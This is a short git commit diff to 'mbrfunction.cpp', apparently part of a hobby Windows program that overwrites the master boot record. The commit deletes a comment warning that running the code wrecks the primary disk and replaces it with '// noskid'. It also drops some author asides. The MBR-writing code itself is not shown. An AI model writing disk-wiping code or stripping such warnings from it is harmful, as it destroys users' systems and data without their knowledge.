64e7c791dd1b2f15e2244dcbfb817519473bd4a0
Lezus <cacitacacita808@gmail.com>
2025-09-27 20:40:01 -0500

    mbrfunction.cpp

--- mbrfunction.cpp
+++ mbrfunction.cpp
@@ -1,4 +1,4 @@
-// QUICK WARNING THIS WILL OVERWRITE THE MBR OF YOUR PRIMARY DISK IF YOU RUN THIS YOUR SYSTEM WILL BE ABSOLUTELY FUCKED-
+// noskid
 
 
 #include <windows.h>
@@ -14,8 +14,3 @@ DWORD WINAPI mbr(LPVOID lpParam) {
     }
     return 0; // updated version becuz i forgot to close the thread (staring to realize how trash tf i am at c++, C# and plain c)
 }
-
-
-// noskid(noskid means its not copied or stolen from someone else) bud
-// if its not complete i apologize im tired and lazy
-// also im not a real C++ Dev or something so dont go roasting me-
